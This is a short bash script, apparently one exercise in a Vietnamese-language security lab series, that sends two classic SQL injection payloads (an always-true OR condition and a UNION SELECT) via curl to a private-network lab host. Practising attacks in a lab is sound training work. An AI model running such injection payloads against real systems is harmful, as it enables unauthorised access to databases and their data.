#!/bin/bash
# 13-sql-injection — SUA IP cho dung lab that truoc khi chay. Day la lenh mau.
VICTIM="192.168.100.20"
curl -G "http://$VICTIM/index.html" --data-urlencode "id=1' OR '1'='1"
curl -G "http://$VICTIM/index.html" --data-urlencode "id=1 UNION SELECT 1,2"
